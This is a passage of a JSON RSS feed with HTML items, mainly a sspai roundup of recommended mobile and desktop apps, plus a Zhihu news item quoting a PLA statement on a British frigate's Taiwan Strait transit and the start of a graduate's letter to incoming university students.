href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>🧓🏻 <a href=\"https://sspai.com/post/68994\" target=\"_blank\">微信 8.0.14 更新：新增适老化「关怀模式」，「折叠群组」终上线</a>\n</li>\n<li>💾 <a href=\"https://sspai.com/post/68956\" target=\"_blank\">在误删硬盘所有分区后，我这样找回所有数据</a>\n</li>\n<li>📧 <a href=\"https://sspai.com/post/69004\" target=\"_blank\">稀松平常的电子邮箱，如何打造成科研人的数字利器？</a>\n</li>\n<li>⭐️ <a href=\"https://sspai.com/post/69006\" target=\"_blank\">派评 | 近期值得关注的 App</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69013"},{"title":"如何看待英航母编队中「里士满」护卫舰 9月 27 日推特发文称正通过台湾海峡，还有哪些信息值得关注？","date":"2021-09-27 10:02:53","description":"\n<p>【英舰过航台湾海峡，东部战区回应：战区部队时刻保持高度戒备，坚决反制一切威胁挑衅！】东部战区新闻发言人施毅陆军大校表示，9月27日，英国“里士满”号护卫舰过航台湾海峡并公开炒作，中国人民解放军东部战区组织海空兵力全程跟监警戒。英方枉费心机刷“存在感”，这种行为居心不良，破坏台海和平稳定，充分暴露了其投机心态。战区部队时刻保持高度戒备，坚决反制一切威胁挑衅。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/dong-bu-zhan-qu-49?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">东部战区</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489290839/answer/2143014337?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">363 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/302290427?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">美国卖台湾的军舰是伯克级的吗？</a><br><a href=\"http://www.zhihu.com/question/363106373?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待2019年12月26日，台军称山东舰编队穿越台湾海峡？</a><br>\n","link":"http://www.zhihu.com/question/489290839/answer/2143014337?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派评 | 近期值得关注的 App","date":"2021-09-27 09:16:03","description":"\n<p>本期《派评》的主要内容有：</p>\n<ul>\n<li>⌚️ 将身边的旧设备变成时钟：Wow 时钟。</li>\n<li>📱 临时需要的电脑外设，手机也能应急：妙妙触控。</li>\n<li>🏅 帮你健康生活的小助手：Gentler。</li>\n<li>🌡️ Today Weather 适配折叠屏，带来了更丰富的小组件自定义功能。</li>\n<li>🧩 PicGo 时隔一年正式版再次更新，动图上传更方便了。</li>\n<li>……</li>\n</ul>\n<p>你可以通过文章目录快速跳转到你感兴趣的内容。如果发现了其它感兴趣的 App 或者关注的话题，也欢迎在评论区和我们进行讨论。</p>\n<h2>不容错过的新 App</h2>\n<h3>Wow 时钟：利旧老设备的多功能时钟</h3>\n<ul>\n<li>平台：iOS / iPadOS / Android</li>\n<li>关键词：时钟、计时器、美化</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Noah_Choi\" user-id=\"bs2oudlb34tch2787tn0\" href=\"https://sspai.com/u/69zxdqx8\">@Noah_Choi</a>：相信各位家里一定有这种老旧设备：念着旧情舍不得扔、放在家里占坑吃灰、回收网站才报价几十块、卖二手还要亏邮费。这些旧设备其实有很多种利用方式，比如监控摄像机、智能家居面板等等，其中比较简单易行的方法就是当作一个文艺小时钟放在电脑桌旁。今天介绍的这款「Wow 时钟」就兼顾了颜值和功能性，让老旧设备发光发热完全不成问题。</p>\n<p>Wow 时钟非常简洁纯粹，是个纯正的绿色产品：应用无广告、没有启动页、不需要请求任何敏感权限、不需要登录、没有各种「生产力」模块等等，简言之就是干净。启动后就直接进入时钟页面，整个屏幕没有任何按钮，所以才特别适合用来常驻显示。表盘制作非常精美，无论是横屏还是竖屏显示效果都非常出色，切换动画自然顺滑，指针边缘和阴影也非常之细腻，秒针跳动时还有仿真回弹，应用细节拉满。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob3lb34tehi7lc3tg.gif\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob3tb34tehemeg50g.gif\" alt=\"\"></figure><p>应用操作依靠手势完成，左右滑动会在翻页数字时钟和模拟指针时钟之间切换，长按表盘切换功能模式，向上滑动进入设置项，在这里，我们可以调整外观样式，每一种配色都会同时修改两种时钟的外观，只可惜目前还不支持自定义配色。比较有趣的是，Wow 时钟在翻页时钟上可以显示十二时辰、十二地支等传统计时方式，看表的同时还能长长见识呢。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob3tb34tehemeg510.jpeg\"></figure><p>设置项会针对时钟模式不同而变化，例如翻页时钟可以修改日期和制式显示，模拟时钟可以打开滴答声和表盘数字。针对 OLED 屏幕，Wow 时钟提供了「OLED 防烧屏」选项，开启后每间隔一段时间就会进入屏幕保护，个人建议选择「五彩纸屑」比较好看。</p>\n<p>Wow 时钟除了表盘显示之外，还提供了倒计时和秒表功能，我们通过长按表盘来切换（切换到其他功能秒表也不会停止），不过这两种功能只提供了翻页时钟样式。值得一提的是 Wow 时钟给倒计时功能增加了背景音选项，启动计时后手机会持续发出溪流、篝火、海滩、森林等声音，这样一来我们甚至可以将它作为定时白噪声 App 来使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob4lb34tehr0hggl0.png\"></figure><p>不仅是老旧设备，Wow 时钟当然也可以用在主力设备上，比如在社区中已经有玩家利用了自动化工具在无线充电时自动打开 Wox 时钟，或者利用 Tasker、Anywhere- 等工具深度调用等。如果 Wow 时钟能开放自定义配色并增加闹钟功能，相信实用性还会大大提升。现在，你可以在 <a href=\"https://play.google.com/store/apps/details?id=com.moonfoxer.wowclock&amp;hl=zh&amp;gl=US\" target=\"_blank\">Google Play</a>、<a href=\"https://apps.apple.com/cn/app/id1558641027\" target=\"_blank\">App Store</a> 和 <a href=\"https://www.coolapk.com/apk/280981\" target=\"_blank\">酷安</a> 免费下载 Wow 时钟，其中 Google Play 版和 App Store 版有内购项。</p>\n<span class=\"ss-application\" app-id=\"16170\"> </span><h3>妙妙触控：把手机当作电脑配件的「妙妙屋」</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：电脑、遥控、PPT</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Noah_Choi\" user-id=\"bs2oudlb34tch2787tn0\" href=\"https://sspai.com/u/69zxdqx8\">@Noah_Choi</a>：我见到过太多太多这种场景：厂商代表来介绍产品，他坐在会议桌边说话边放映胶片，讲到重点时跑到幕布前指指划划，随即再跑回去；这样来回几次，他已经气喘吁吁，产品讲解也七零八落。每当这时候我就在想，如果能随身带一只遥控器就好了。而相比每次开会都多带一个小玩意，不如利用好真正会随身携带的东西——手机。妙妙触控就是这样一个 App，它能把手机变成触摸板、遥控器、激光笔等多种设备，几乎涵盖了所有应用场景，而且它还不需要在电脑上安装任何驱动或软件，简单操作之后就一劳永逸。</p>\n<p>市面上已经有很多应用可以将手机模拟成电脑触摸板，这也是妙妙触控的基础功能，在「触摸板」模式下，我们可以执行指针滑动、单指单击、双指单击、双指滚动，并可以利用左下角的隐藏功能区执行长按鼠标左键拖动的功能，界面内集成了快捷按钮以及键盘弹出按键。不过遗憾的是目前妙妙触控并不支持双指缩放以及三指以上的手势，因此也不能实现 Windows 上的多任务、回到桌面等触摸板功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob4lb34tehemeg51g.png\"></figure><p>另一个妙妙触控主打功能是「PPT演示」。应用内集成了播放、结束、翻页、黑屏等快捷功能按钮，比较有趣的是激光笔功能，除了可以利用触摸板挪动虚拟光斑，我们还可以按住触摸板右下角的隐藏功能区实现「Air Mouse」功能，即像真正激光笔那样指哪打哪，操作起来与 Playstation 手柄打字有异曲同工之妙，灵敏度和精确度都非常不错，在放映 PPT 时我们可以更加潇洒从容了。当然，这个功能也可以用在任何有触摸板的功能界面都可以使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob55b34tehr0hgglg.gif\"></figure><p>小键盘和快捷键功能也非常值得一试。小尺寸笔记本为了体积便捷一般不会配备数字小键盘，虽然平时用不到，但需要时就比较麻烦。而妙妙触控这个小键盘功能就随叫随到、即用即走，放在笔记本键盘右边也真像那么回事。快捷键功能可以看作是简易「键盘宏录制」，需要时一键触发，省时省力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob5lb34tehi7lc3u0.png\"></figure><p>除此之外，妙妙触控还可以模拟多媒体快捷控制、虚拟标准键盘等，随着版本迭代还会增加更多新功能。虽然平时不一定会用到它，但手机里常备一个也能应付更多场景。如果你也感兴趣，可以前往 <a href=\"https://play.google.com/store/apps/details?id=com.opq.wonderfultouch\" target=\"_blank\">Google Play</a> 和 <a href=\"https://www.coolapk.com/apk/com.opq.wonderfultouch\" target=\"_blank\">酷安</a> 免费下载妙妙触控，应用内购 4.99 美元或 30 元人民币可永久解锁部分功能限制。</p>\n<span class=\"ss-application\" app-id=\"16171\"> </span><h3>Pixel Wallpapers：Pixel 内置壁纸大集合</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：壁纸、Pixel</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Peggy_\" user-id=\"bs2p015b34tch278nkdg\" href=\"https://sspai.com/u/5isr02uh\">@Peggy_</a>：不知道你是否和我一样，永远觉得最好看的壁纸是别人的手机壁纸，使用 Android 手机多年以来，尽管大部分情况下我的手机是 Xperia，但我陆陆续续也尝试过体验各个手机厂商的内置壁纸，譬如一加、三星、小米等手机品牌的壁纸都各具特色，而 Pixel 自诞生以来，伴随着它更新换代的除了外观和硬件，还有内置壁纸。</p>\n<p>不同于以往需要在各个论坛下载压缩包，Pixel Wallpapers 这一应用能让你在一处就遍览历代 Pixel 的内置壁纸。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob5tb34tehi7lc3ug.jpeg\"></figure><p>Pixel Wallpapers 不但对于以往各个机型、各个主题的 Pixel 壁纸收录足够全面，还细致地对壁纸做好了分类，方便用户检索。除了按照机型分类外，Pixel Wallpapers 还将 PRIDE 系列、BLACK HISTORY MONTH 系列、EARTH DAY 系列等具备特殊意义的壁纸合集也收录其中，就连还未上市开卖的 Pixel 6 系列内置壁纸你也能够抢先体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob65b34tehr0hggm0.jpeg\"></figure><p>此外，由于壁纸数量众多，Pixel Wallpapers 设计了收藏功能，如果你不希望下载过多的壁纸占据空间，但同时又想要方便地获取特定壁纸，使用收藏功能标记后再按需下载是个不错的方案。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob6db34tehi7lc3v0.jpeg\"></figure><p>你可以通过 Pixel Wallpapers 的 <a href=\"https://github.com/wacko1805/Pixel-Wallpaper-app\" target=\"_blank\">GitHub</a> 项目地址来下载体验。</p>\n<h3>Gentler：小助手 Yorhart 帮你更好地健康生活</h3>\n<ul>\n<li>平台：iOS</li>\n<li>关键词：运动、健康、习惯养成</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Vanilla\" user-id=\"bs2ov5lb34tch278f9ag\" href=\"https://sspai.com/u/whoops\">@Vanilla</a>：我们对用形形色色的图表来展示健康数据的 APP 早已司空见惯，远的不说，近的就有少数派专门撰文介绍过的 Grow 和 FitnessView。不过，今天要介绍的这款健康 App 有点不太一样，因为它除了兼顾传统的图表展示形式，还加入了一个智能助手的功能，可以通过分析数据后用生动形象的语言来描述我的健康状态，并且给出相应的建议。</p>\n<p>在首页，Gentler 会根据我最近 10 天的运动情况来一个折线趋势图，然后小助手 Yorhart 会分析这个趋势并给出相应的建议。如果我最近的折线趋势图是整体向下的，那么它会建议我加大运动量；如果我最近的折线趋势图是整体向上的，那么它会建议我要适时休息；如果我最近的折线趋势图比较均衡的，那么它会建议我继续保持。非常有意思的是，我还可以更改自己的生理状态，当我把状态从活跃切换为休息、生病或者受伤时，首页上的折线趋势图就会取消，小助手 Yorhart 也会建议我好好休息、早日恢复。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob6lb34teho7grgpg.jpeg\"></figure><p>在 Insights 标签页，Gentler 提供了一个知识库，可以根据我的自身需求量身打造一套短篇文章，从 App 使用、饮食、运动等多个方面帮助我更好地获得健康的生活。每一篇文章都非常简短精炼，不过目前只有英文版，可能对很多人来说阅读起来不是很友好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob6tb34tehemeg520.jpeg\"></figure><p>除此之外，Gentler 也提供了非常详细的运动数据展示界面。在 Activities 标签页中，Gentler 展示了最近周视图、月视图、年视图和所有时间视图的总结数据，包括趋势图、持续时间、活跃消耗能量、距离、爬山高度等，以及每一次记录的运动。而在详细的运动界面中，我还可以看到地图上的路线、心率图等信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob7db34tehemeg52g.jpeg\"></figure><p>如果你也想尝试一下不一样的健康助手，那么 Gentler 值得一试。你可以从 App Store 免费下载应用，然后以 38 元/月或者 188 元/年的订阅价格解锁更多的功能。除了 Apple Watch，目前 Gentler 还支持了佳明、颂拓、博能等多个品牌的智能手表。</p>\n<span class=\"ss-application\" app-id=\"16172\"> </span><h3>减法相册：整理一下，你的相册需要「瘦身」吗？</h3>\n<ul>\n<li>平台：iOS</li>\n<li>关键词：相册、精简、断舍离</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Snow\" user-id=\"bs2od75b34tch2730o80\" href=\"https://sspai.com/u/ul0vcezb\">@Snow</a>：习惯了数码摄影的我们，对于「快门数」的纠结早就不复存在，对焦虚了再拍一张，角度不好再拍一张，画面过曝再拍一张，路人误入再拍一张……相册里的「废片」不在少数，再加上像素的提升，即使开通 iCloud 同步，照片占据的存储空间大约也是仅次于「小而美」的存在。如果你的空间不够用了，又或是准备整理一波相册，不妨试试近期刚上架 App Store 的「减法相册」。</p>\n<p>和之前推荐的 <a href=\"https://sspai.com/search/app/%E6%B3%BC%E8%BE%A3%E7%9B%B8%E5%86%8C\" target=\"_blank\">泼辣相册</a> 类似，应用提供了手动整理和快捷整理两类功能。在手动整理中，应用按时间逻辑由新至旧，以月为单位拆分相册。点击「开始整理」后，你就可以利用手势对照片素材进行快速收藏、删除和跳过操作，相比系统相册，效率会高出不少。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob7lb34tehemeg530.jpeg\"></figure><p>更高效的功能体现在快捷整理中，应用会自动识别出相册中相似或重复的图片素材，以及截图和视频内容。在相似照片和重复项中，你可以「一键删除」冗余内容，瞬间释放存储空间。当然，有时 AI 的审美还是一言难尽，应用还是提供了预览功能，你可以通过勾选的方式在相似照片中手动筛选删除。</p>\n<p>应用包含内购项，你可以按每月 20 元或每年 68 元的价格订阅，也可以 208 元直接买断，批处理功能需内购才可正常使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob7tb34tehemeg53g.jpeg\"></figure><p>鉴于相册整理并不需要频繁使用，你可以根据自己的整理频率选择付费方式。值得一提的是，在其他照片清理应用中常见的滤镜原图以及 Live photos 批处理功能并未在应用中出现，不过考虑应用刚刚上架，后续有很大的优化空间，你可以观望或试用一下再决定是否购买。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/%E5%87%8F%E6%B3%95%E7%9B%B8%E5%86%8C-%E7%85%A7%E7%89%87%E8%A7%86%E9%A2%91%E6%95%B4%E7%90%86%E5%B7%A5%E5%85%B7/id1580710672\" target=\"_blank\">App Store</a> 上免费下载「减法相册」。</p>\n<span class=\"ss-application\" app-id=\"16173\"> </span><h2>值得关注的 App 更新</h2>\n<h3>Today Weather 2.0：适配折叠屏，小组件开放自定义</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：天气</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Noah_Choi\" user-id=\"bs2oudlb34tch2787tn0\" href=\"https://sspai.com/u/69zxdqx8\">@Noah_Choi</a>：知名天气应用 Today Weather 近日在 Android 平台释出更新，适配了当前风头正劲的可折叠屏设备，并允许用户自定义桌面小组件样式。</p>\n<p>Today Weather 原本在首页只会显示当前天气以及相关气象信息，未来天气预报则隐藏于二级菜单中。更新后的 Today Weather 能够在可折叠屏幕展开后，在两侧分别展示今日天气信息和未来几天内的天气预报。实际上，这一特性也可以应用于平板电脑、会议屏幕等大尺寸设备上，当屏幕宽度足够时，Today Weather 就可以触发这一特性。这样一来就能提升屏幕利用率，不用再点来点去查看未来天气预报了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob85b34teho7grgq0.jpeg\"></figure><p>另一项更新内容事关屏幕小组件。其他应用的屏幕小组件可有可无，但天气应用的屏幕小组件可以说是它的半边天。Today Weather 的开发者认为「Google 将在 Android 12 上应用 Material You 风格，因此会允许用户自定义符合这一新外观的小组件样式」。个性化、独特、有活力正是 Material You 的内核，所以更新后 Today Weather 小组件的基准样式不仅更贴近 Material You 风格，并且给用户开放了更多个性化选项 。现在，你可以自定义文字尺寸、对齐方式、小组件配色、圆角弧度、天气图标等等内容，利用这 21 个小组件打造出一个充满个性化的主屏才更符合 Material「You」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob8db34tehr0hggmg.png\"></figure><p>与此同时，Today Weather 还新增了更多气象数据源，其中还包括了许多国家官方的气象数据源，还滞留在国外的同学不仅要做好防护，也要多多关心天气变化。目前新版本 Today Weather 已经上架 <a href=\"https://play.google.com/store/apps/details?id=mobi.lockdown.weather\" target=\"_blank\">Google Play</a>，感兴趣的朋友可以前去更新，iOS 和 iPadOS 用户可以在 <a href=\"https://apps.apple.com/cn/app/id1214962662\" target=\"_blank\">App Store</a> 下载 Today Weather。</p>\n<span class=\"ss-application\" app-id=\"14489\"> </span><h3>记录你的片段感悟：flomo 浮墨笔记</h3>\n<ul>\n<li>平台：iOS、Android、Web</li>\n<li>关键词：笔记、碎片笔记、记录</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@化学心情下2\" user-id=\"bs2od75b34tch2730oa0\" href=\"https://sspai.com/u/liuxiaofengone\">@化学心情下2</a>：如果你又将零散的信息记录下来的需求，那么确实可以试试浮墨笔记——类似发微博一样记录下你的片段思考，让这些零碎的想法变成一张张知识卡片，最终汇聚在这里。</p>\n<p>相比某些笔记类软件早已成为大杂烩的代名词，浮墨笔记依旧保留了纯粹的便签笔记风格——回归到思想的汇集，而不是内容的收纳，这种功能更新上的克制也反映在近期的功能更新上，你会觉得这些新特性只会让浮墨笔记更好用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob8lb34teho7grgqg.png\"></figure><p>在最新的 Android 版客户端中，终于可以整体调整文字的字号大小，并且过长 MEMO 也可以被折叠，原本笔记中标签上的 emoji 表情也进行了更新（看上去似乎更可爱一些），并且还支持离线发布功能，其实不难看出，这些功能都是在现有的基础上让浮墨笔记更好用一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob8tb34tehi7lc3vg.png\"></figure><p>当然除了 Android 客户端之外，flomo Plus 这个浏览器扩展也有了新功能，现在我们将自己的饭否、豆瓣日记、多看读书笔记、极客时间笔记、bilibili 笔记导入到 flomo 中，说实话将这些阅读平台中的笔记导入到一个平台进行管理，确实可以节省不少的管理和整理精力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58ob95b34tehi7lc400.png\"></figure><p>而另一个工具 Kindle2flomo 也在近期迎来了更新，原本只是将 Kindle 的读书笔记文件导入到 flomo，而现在可以导入的笔记还包括 AppleBooks，导入的方式其实大同小异，都是解析 Html 然后加上你的 flomo API 最终导入到 flomo 中，结合 flomo Plus 基本上可以实现在 flomo 对各读书平台的统一笔记整理。</p>\n<p>此外 flomo 也在近期推出了英文版本，如果你正在使用浮墨笔记不妨试试这些新功能。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"236\" type=\"genuineSoftware\"> </span><h3>PicGo 更新汇总</h3>\n<ul>\n<li>平台：Windows、macOS、Linux</li>\n<li>关键词：图床、自动化、写作</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@红酒皇\" user-id=\"bs2p85tb34tcs0pmdeeg\" href=\"https://sspai.com/u/Fabrina\">@红酒皇</a>：时隔一年多，PicGo 又更新了一次正式版，并修复了不少错误。作为一款上传图片的轻便应用，PicGo 此次更新对于其获取图片链接的相关服务支持也获得了相应的加强。2.3.0 版本的更新主要聚焦于以下两个方面。</p>\n<p><strong>传图动作的便捷性：</strong></p>\n<ul>\n<li>支持通过图片 URL 上传到图床中；</li>\n<li>支持拖拽网页图片上传到图床中；</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/830c17366377a79866cae009f225473f.gif\"></figure><ul>\n<li>支持全选和使用 SHIFT 批量操作；</li>\n<li>支持电脑端生成配置二维码快速导入手机客户端，而无需手动设置；</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/aa85e81624243e052fdf1caeb65432c4.png\"></figure><ul><li>分离上传图片和复制链接的强关联性，允许单独上传。</li></ul>\n<p><strong>插件配置的丰富性：</strong></p>\n<ul>\n<li>不再需要额外安装适合 SM.MS v2 的插件，而可以使用应用自带的上传服务；</li>\n<li>支持导入本地插件，免除了安装在线插件故障的烦恼；</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/2cfd5865f75341545ff84d89e83089e3.png\"></figure><ul><li>除了自带的插件外，还支持插件安装代理，插件安装镜像以提升安装速度；</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/67a5320104ed864a91258a0965353f99.png\"></figure><ul>\n<li>支持配置文件路径自定义，促进 onedrive 同步流畅化；</li>\n<li>配置文件和相册数据分离，可以单独备份相册内容；</li>\n<li>支持包括 ICO、HEIC 等在内的更多图片格式。</li>\n</ul>\n<p>除此之外，还有积累修复的一些 bugs ，对于上传图片和获取图片 URL 链接的高强度快捷使用具有足够的增强，都体现出 PicGo 开发过程中加强用户使用体验的决心和能力。</p>\n<p>你可以在 GitHub 上下载 <a href=\"https://github.com/Molunerfinn/PicGo\" target=\"_blank\">PicGo</a> ，目前该应用支持 Windows 、macOS 以及 Linux 平台。</p>\n<p>文中图片来自<a href=\"https://sspai.com/post/68697\" target=\"_blank\">《 PicGo 2.3.0 正式版发布，来看看更新了什么》</a>。</p>\n<h2>App 速报</h2>\n<ul>\n<li>Your Phone（<a href=\"https://www.microsoft.com/zh-cn/p/your-phone/9nmpj99vjbwv?activetab=pivot:overviewtab\" target=\"_blank\">Windows 10</a> | <a href=\"https://play.google.com/store/apps/details?id=com.microsoft.appmanager\" target=\"_blank\">Android</a>）：新版本在手机预览图下方增加了勿扰模式、蓝牙、响铃模式和音乐播放器四个开关，可以在不点亮手机的情况下开启或关闭相应功能。</li>\n<li>Overcast（<a href=\"https://apps.apple.com/cn/app/overcast/id888422857\" target=\"_blank\">iOS</a>）：更新至 v2021.10 版，带来新的主屏幕小部件选项（三种样式），基于 CarPlay 新功能，包括最近播放、速度控制以及章节显示等。</li>\n<li>ShiftScreen（<a href=\"https://apps.apple.com/cn/app/shiftscreen-4x/id1573652748#?platform=ipad\" target=\"_blank\">iPadOS</a>）：可以将显示器作为 iPad 的第二个屏幕，新版本支持完整的鼠标以及触控板支持，显示器支持 60Fps，并支持超过 50 个键盘快捷键。</li>\n<li>可立拍（<a href=\"https://apps.apple.com/cn/app/clips/id1212699939\" target=\"_blank\">iOS | iPadOS</a>）：更新至 v3.1.2，支持导入和编辑在 iPhone 13 上以「电影效果」模式拍摄的视频，可以将滤镜、贴纸和表情符号等效果应用到以「电影效果」模式录制的视频，轻点一下即可添加「照片」图库中的视频或照片，无需在项目中单独录制；导入和编辑 ProRes 视频并可将 ProRAW 图像添加到视频中。</li>\n<li>1Password（<a href=\"https://apps.apple.com/cn/app/1password-password-manager/id568903335\" target=\"_blank\">iOS | iPadOS</a>）：更新至 v7.8，针对 iOS 15 以及 iPadOS 15 推出桌面级的浏览器扩展，可以在浏览网页时填充登录名和密码等信息。</li>\n<li>Ulysses（<a href=\"https://apps.apple.com/cn/app/ulysses/id1225571038#?platform=ipad\" target=\"_blank\">iPadOS</a>）：更新至 v24，支持导出始终在新窗口中打开，大幅改进了使用外接键盘导航时的反馈。改进部分文稿文件现在可以在「文件」和「信息」等应用程序中预览，支持文库中隐藏外部文件夹,修复了大屏 iPhone 在旋转到横屏模式和返回竖屏模式时出现的布局问题。</li>\n<li>Fantastical（<a href=\"https://apps.apple.com/cn/app/fantastical-calendar-tasks/id718043190\" target=\"_blank\">iOS | iPadOS</a>）：更新至 v3.4.4，增加了对隐私敏感小部件的支持、支持快速笔记。添加了自动将 Microsoft Teams 会议添加到新事件的选项以及对检测 DialPad 会议的支持。</li>\n<li>VLC（<a href=\"https://play.google.com/store/apps/details?id=org.videolan.vlc\" target=\"_blank\">Android</a>）：更新至 v3.4，加入了媒体书签功能，支持不授予文件权限的情况下使用 VLC 观看流媒体，改进了音频播放器，Android Auto 也已经完全重新设计，播放列表也更为清晰。</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69006"},{"title":"即将步入大学的你对大学生活有哪些期待？作为过来人对准大学生又有什么祝福与建议？","date":"2021-09-26 12:26:12","description":"\n<p>中南大学李铭泽，中南大学外国语学院团委学生会青年志愿者协会部长；YoungsBlood青年组织活动执行与人力资源管理负责人，全国大学生非遗保护组织CEO、创始人；现任中南大学国际组织人才培养朋辈导师。李铭泽参与国际论坛与元首会见10余场，国际交流5次，组织校内国际组织活动3次，带领1000余名中南学子探索国际组织；曾赴美国纽约联合国总部实习，在联合国会议发言，讲述中国故事，展现中南风采。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1841f40944f493de47031e65e7862ec2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"449\" data-watermark=\"original\" data-original-src=\"v2-1841f40944f493de47031e65e7862ec2\" data-watermark-src=\"v2-a8b77e08602a49342e9e4987b4f2d33b\" data-private-watermark-src=\"v2-e85d55d63de130a42b399d18126969a4\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-16630e02a93729f7c56fa07f393654e3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"350\" data-watermark=\"original\" data-original-src=\"v2-16630e02a93729f7c56fa07f393654e3\" data-watermark-src=\"v2-b3301ed31af86c9f9bbb88da18034f09\" data-private-watermark-src=\"v2-a75fbf4dbddf495f14d9962bc4942027\"></p>\n<p><b>学弟学妹们：</b></p>\n<p>展信佳！</p>\n<p>我离开中南大学已期月有余，一直挂念。四年荏苒，让我对“中南”这个字眼越来越敏感——博友晒通知书，首先抓到的是中南的一抹蓝；长沙疫情告急，首先想到是在校的挚友；奥运健儿夺冠，首先看到的是中南校友的身姿。舞象之年，初至湖湘，四岁枯荣，再话道别，还是有些伴着思念的话想说一说。</p>\n<p><b>一、四年教育，是为了让你的人生选项像湘江支流一样多。</b></p>\n<p>读书的目的，是为了让自己有更多的选择权——这是我一直坚信的。我们正处在一个需要不断做选择、又很难做选择的年纪，因为底气不足所以举步维艰，而这四年教育就是我们日后最大的底气。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c0463ef8c1416f189a60d154be09ffa0_720w.jpg?rss\" data-caption=\"（中南大学外国语学院2021年学位授予仪式上的李铭泽）\" data-size=\"normal\" data-rawwidth=\"600\" 